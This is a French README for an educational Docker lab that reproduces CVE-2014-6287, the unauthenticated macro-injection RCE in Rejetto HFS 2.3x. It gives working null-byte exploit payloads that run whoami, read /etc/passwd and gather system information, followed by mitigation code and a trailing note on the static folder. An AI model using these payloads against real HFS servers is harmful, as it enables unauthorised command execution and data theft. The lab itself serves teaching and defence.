# Lab DIABLE - CVE-2014-6287 (HFS RCE)

**Version:** 1.0  
**Auteur:** DIABLE Team  
**Tag:** WEB  
**Difficulté:** Moyen

---

## Description

CVE-2014-6287 est une vulnérabilité de type Remote Code Execution (RCE) affectant **HFS (HTTP File Server) 2.3x** de Rejetto. Elle permet à un attaquant non authentifié d'exécuter des commandes arbitraires sur le serveur en injectant des macros HFS dans le paramètre de recherche, combiné à un null byte (`%00`) pour contourner la vérification de sécurité.

---

## Objectifs pédagogiques

- Comprendre le mécanisme de bypass par null byte
- Identifier les moteurs de templates/macros vulnérables
- Exploiter une RCE non authentifiée via une requête GET simple
- Mettre en place des contre-mesures adaptées

---

## Installation et démarrage

### Prérequis

- Docker Desktop ou Docker Engine
- Docker Compose

### Démarrage rapide
```bash
git clone <URL>
cd cve-2014-6287-lab
docker-compose up -d
# Accéder à http://localhost:8085
```

### Build manuel
```bash
docker build -t diable/cve-2014-6287-lab .
docker run -d -p 8085:80 --name hfs-rce-lab diable/cve-2014-6287-lab
```

---

## Structure du projet
```
cve-2014-6287-lab/
├── Dockerfile
├── docker-compose.yml
├── .dockerignore
├── README.md
└── src/
    ├── app.py          # Application Flask vulnérable
    ├── config.py       # Configuration
    ├── templates/
    │   └── index.html  # Interface HFS simulée
    └── static/
        └── style.css   # Thème DIABLE
```

---

## Scénarios disponibles

### Scénario 1 : RCE basique — whoami

**Objectif:** Vérifier l'exécution de commandes en tant qu'utilisateur serveur

**Cible:** `/?search=`

**Technique:** Null byte bypass + macro exec

**Payload:**
```
GET /?search=%00{.exec|whoami.} HTTP/1.1
```

**Résultat:** Affiche l'utilisateur courant (ex: `root` ou `www-data`)

---

### Scénario 2 : Lecture de fichier sensible

**Objectif:** Lire `/etc/passwd` via RCE

**Payload:**
```
GET /?search=%00{.exec|cat /etc/passwd.} HTTP/1.1
```

**Résultat:** Contenu du fichier système affiché

---

### Scénario 3 : Reverse shell (simulation)

**Objectif:** Comprendre le potentiel d'escalade

**Payload:**
```
GET /?search=%00{.exec|id && hostname && uname -a.} HTTP/1.1
```

**Résultat:** Informations système complètes

---

## Théorie: CVE-2014-6287

HFS (HTTP File Server) de Rejetto intègre un moteur de **macros** permettant d'automatiser des opérations serveur (ex: `{.exec|cmd.}`). La version 2.3x contient une vérification censée bloquer les macros dans les requêtes entrantes :
```pascal
if (pos(#0, s) > 0) then exit;
```

Cette vérification est **bypassée** en préfixant la requête avec un null byte URL-encodé (`%00`). Le moteur de macros traite alors la chaîne entière, exécutant les commandes sans authentification.

**CVSS Score:** 10.0 (Critical)  
**Vecteur:** Network / No Auth / Low Complexity

---

## Mesures de protection

### 1. Validation stricte des entrées
```python
import re

def safe_search(query: str) -> str:
    # Rejeter toute entrée contenant des null bytes
    if '\x00' in query:
        raise ValueError("Invalid input: null byte detected")
    # Whitelist de caractères autorisés
    if not re.match(r'^[\w\s\-\.]{0,100}$', query):
        raise ValueError("Invalid characters in search query")
    return query
```

### 2. Ne jamais évaluer les entrées utilisateur comme du code
```python
# VULNERABLE
subprocess.call(user_input, shell=True)

# SÉCURISÉ
allowed_commands = ["list", "info"]
if user_input in allowed_commands:
    subprocess.call([user_input], shell=False)
```

### 3. Mise à jour HFS

Mettre à jour vers HFS 2.3f ou supérieur qui corrige ce vecteur.

---

## Commandes utiles
```bash
# Voir les logs
docker logs -f hfs-rce-lab

# Health check
curl http://localhost:8085/health

# Reset du log de commandes
curl http://localhost:8085/reset

# Test exploit direct
curl "http://localhost:8085/?search=%00{.exec|whoami.}"
```

---

## Dépannage

- **Port déjà utilisé** : Changer `8085` dans `docker-compose.yml`
- **Permission denied** : Vérifier que Docker tourne avec les bons droits
- **Macro non exécutée** : Vérifier que `%00` est bien envoyé (certains navigateurs l'encodent différemment — utiliser `curl`)

---

## Licence

Lab développé pour le projet DIABLE v3.0 (DSI ISFA 2025-2026).

**⚠️ Avertissement:** Vulnérabilités intentionnelles à des fins éducatives. Ne JAMAIS déployer en production.

---

## Auteur

**DIABLE Team**  
DSI ISFA 2025-2026
```

---

## ⚠️ One important note on the `static/` folder

Flask serves static files from `src/static/`, so move `style.css` there:
```
src/
├── app.py
├── config.py
├── static/
│   └── style.css
└── templates/
    └── index.html